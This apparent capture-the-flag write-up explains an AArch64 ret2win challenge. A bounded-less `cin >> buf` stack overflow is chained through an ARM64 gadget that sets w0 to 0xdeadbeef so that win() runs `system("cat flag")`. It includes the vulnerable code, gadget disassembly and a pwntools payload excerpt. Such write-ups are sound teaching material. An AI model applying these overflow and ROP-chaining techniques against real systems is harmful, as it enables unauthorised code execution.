---
title: "ARMBLUSBLUS"
area: the-stack
role: author
event: pioneers25
published: 2026-03-20
summary: "An unbounded cin >> buf overflow on AArch64 is chained through a gadget that loads w0 to satisfy win(int)'s check."
techniques: ["stack overflow", "ret2win", "ROP", "aarch64"]
difficulty: medium
arch: aarch64
---

## Overview
This challenge is an AArch64 (ARM64) statically linked binary. The vulnerability is a classic C++ stack overflow: `cin >> buf` reads an unbounded word into a fixed-size local array. The goal is to reach `win(int)` with the correct argument (`0xdeadbeef`) so it runs `system("cat flag")`.

Because this is AArch64, the first integer argument is passed in register `w0`/`x0`, not on the stack. The solver therefore uses a gadget that loads `w0` from the stack before returning into `win()`.

## Vulnerability analysis

In `vuln()`:

```cpp
char buf[0x40];
cin >> buf;
```

`operator>>` for `char*` has no inherent bounds checking here. A long input overwrites saved frame data (including the saved link register / return address), giving control of execution.

The privileged function is:

```cpp
void win(int x10){
	if(x10==0xdeadbeef){
		system("cat flag");
	}
}
```

So we need control of both:
- return address (to redirect control to `win`)
- `w0` (to satisfy the `0xdeadbeef` check)

## Exploitation strategy (matches `solve.py`)

### Step 1 — Use a gadget to set `w0` from the stack
The solver uses this ARM64 gadget:

```python
gadget = 0x458c38
# 0x0000000000458c38 :
#   ldr w0, [sp, #0x1c]
#   ldp x29, x30, [sp], #0x20
#   ret
```

Meaning:
- `w0 = *(uint32_t*)(sp + 0x1c)`
- pop `x29` and `x30` from the stack
- `ret` to `x30`

If we arrange the stack so that:
- `[sp+0x1c]` contains `0xdeadbeef`
- `x30` popped by `ldp` is the address of `win(int)`

then the gadget sets the argument and returns directly into `win()`.

### Step 2 — Build the overflow layout
Solver excerpt:

```python
payload = (
	b"a"*0x48
	+ p64(gadget)
	+ b"b"*(0x1c - 8 - 8 - 4)
	+ p64(e.sym._Z3wini)
	+ b"a"*(8 + 4)
	+ p64(0xdeadbeef)
)
p.sendline(payload)
```

What the padding is doing:
- `b"a"*0x48` reaches and overwrites the saved return address so execution goes to `gadget`.
- the following bytes are shaped so that, when the gadget runs, the stack positions consumed by:
  - `ldp x29, x30, [sp], #0x20`
  - `ldr w0, [sp, #0x1c]`
  contain a valid `x30` (pointing to `win`) and the desired 32-bit value `0xdeadbeef`.

### Step 3 — `win()` executes
With `w0 == 0xdeadbeef`, the condition passes and the program executes `system("cat flag")`.

## Notes
- The binary is `EXEC` (non-PIE) and statically linked, so function/gadget addresses are stable across runs (useful for straightforward ret2win).
